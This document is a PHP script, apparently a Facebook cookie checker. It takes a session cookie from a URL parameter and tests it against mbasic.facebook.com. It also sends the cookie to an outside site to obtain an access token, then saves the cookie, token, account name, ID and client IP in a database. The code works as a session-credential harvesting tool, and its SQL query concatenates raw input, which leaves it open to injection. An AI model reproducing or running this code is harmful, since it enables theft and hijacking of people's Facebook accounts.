<?php
date_default_timezone_set("Asia/Ho_Chi_Minh");
$date=date("Y-m-d");
$ip = $_SERVER['HTTP_CLIENT_IP']; 
if($ip==""){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }

$cookie=$_GET["cookie"];
$value=$_GET["value"];
function fb($url, $hd){
$o= curl_init();
curl_setopt_array($o, array(
CURLOPT_URL => $url,
CURLOPT_PORT => "443",
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_ENCODING => "",
CURLOPT_HEADER => true,
CURLOPT_HTTPHEADER => $hd));
$x = curl_exec($o); 
curl_close($o);
return $x;
}
$hd = array(
"Host:mbasic.facebook.com",
"upgrade-insecure-requests:1",
"user-agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5057.107 Safari/537.36",
"x-requested-with:mark.via.gp", 
"sec-fetch-site:none", 
"sec-fetch-mode: navigate",
"sec-fetch-user:?1",
"sec-fetch-dest:document", 
"cookie:$cookie",
);
$token=file_get_contents("https://thuongdz.name.vn/Api_tds/func_fb.php?get_token=EAAG&cookie=$cookie");
$test = fb("https://mbasic.facebook.com/",$hd);
$check= strpos($test,"Đăng xuất");
if($value==""){
if($check!=''){
 $check=fb("https://mbasic.facebook.com/profile.php",$hd);
 $ten= explode('<![CDATA',explode('<head><title>',explode('</title><meta', $check)[0])[1])[0];
 $id= explode("c_user=",explode(";xs",$cookie)[0])[1];
 $age = array("data"=>"Live","user"=>$ten,"id"=>$id);
require_once 'ketnoi.php';
$ip = $_SERVER['HTTP_CLIENT_IP']; 
if($ip==""){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }
$themck="INSERT INTO `cookiefb` (`id`, `data`, `name`, `idfb`, `cookie`, `token`, `date`, `ip`) VALUES (NULL, 'Live', '$ten', '$id', '$cookie', '$token', '$date', '$ip')";
$a= json_encode($age);
echo$a;
mysqli_query($ketnoi, $themck);

}else{
   $age = array("data"=>"Die");
echo json_encode($age);
}
}else{
if($check!=''){
 $check=fb("https://mbasic.facebook.com/profile.php",$hd);
 $ten= explode('<![CDATA',explode('<head><title>',explode('</title><meta', $check)[0])[1])[0];
 $id= explode("c_user=",explode(";xs",$cookie)[0])[1];
 $age = array("data"=>"Live","user"=>$ten,"id"=>$id);
 $dulieu = array("cookie"=>"$cookie","token"=>"$token");
 $age1 = array("data"=>$dulieu,"user"=>$ten,"id"=>$id);
$a= json_encode($age1);
echo$a;
$b= json_encode($age1);
}else{
   $age = array("data"=>"Die");
echo json_encode($age);
}
}


?>
